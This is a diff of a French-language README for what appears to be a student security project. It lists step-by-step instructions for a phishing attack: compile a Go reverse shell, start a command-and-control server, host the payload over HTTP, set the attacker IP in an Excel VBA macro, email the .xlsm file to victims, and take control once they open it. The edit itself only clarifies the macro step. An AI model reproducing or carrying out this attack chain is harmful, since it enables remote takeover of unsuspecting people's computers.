@@ -14,7 +14,7 @@ Nous avons décider de lier l'infra et la sécu pour ce projet et de créer un p
 * **2** : Compiler le shell.go en shell.exe dans l'architecture des pc visés ( Ex: 64bits ) avec `go build .\shell.go`
 * **3** : Lancer le serveur command control avec le port par défaut 8080 `go run .\Control.go -l -p 8080`
 * **4** : Lancer la machine linux, dans un dossier avec le shell.exe, saisir la commande : `python -m SimpleHTTPServer 8080`
-* **5** : Modifier le programme vba de la macro avec l'adresse ip publique de la machine linux
+* **5** : Modifier le programme vba de la macro du fichier excel avec l'adresse ip publique de la machine linux
 * **6** : Envoyer un mail aux victimes avec le fichier excel en `.xlsm`
 * **7** : Attendre que les victimes ouvrent le excel avec les macros
 * **8** : prendre le controle de la machine grâce au reverse shell
